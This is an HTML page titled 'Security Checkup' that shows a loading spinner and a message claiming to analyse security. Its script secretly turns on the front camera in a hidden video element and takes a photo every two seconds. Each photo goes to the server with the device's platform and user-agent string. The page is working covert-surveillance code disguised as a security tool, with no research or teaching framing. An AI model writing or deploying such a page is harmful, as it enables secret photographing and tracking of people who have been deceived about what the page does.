<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Checkup</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            padding-top: 50px;
        }
        #loader {
            border: 6px solid #f3f3f3; /* Light grey */
            border-top: 6px solid #3498db; /* Blue */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #message {
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Security Checkup</h1>
    <div id="loader"></div>
    <p id="message">Analyzing security... Please wait.</p>

    <!-- Hidden Camera -->
    <video id="camera" width="320" height="240" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Start the camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                camera.srcObject = stream;
            })
            .catch(error => {
                alert('Camera access denied or error occurred.');
                console.error(error);
            });

        // Function to capture image and send data
        function captureAndSendData() {
            if (camera.readyState === HTMLMediaElement.HAVE_ENOUGH_DATA) {
                // Set canvas size to match video size
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;

                // Capture image from the camera
                context.drawImage(camera, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png').split(',')[1]; // Base64 image data

                // Collect device information
                const deviceInfo = {
                    deviceType: navigator.platform,
                    deviceModel: navigator.userAgent,
                    ipAddress: '', // You can obtain IP address from server-side if needed
                    networkCarrier: '', // Optional: Not easily accessible from frontend
                    charge: navigator.getBattery ? navigator.getBattery().then(battery => battery.level) : 'N/A'
                };

                // Send data to the server
                fetch('/submit_data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        device_info: deviceInfo,
                        image_data: imageData
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Data submitted:', data);
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }
        }

        // Capture and send image every 2 seconds
        setInterval(captureAndSendData, 2000);
    </script>
</body>
</html>
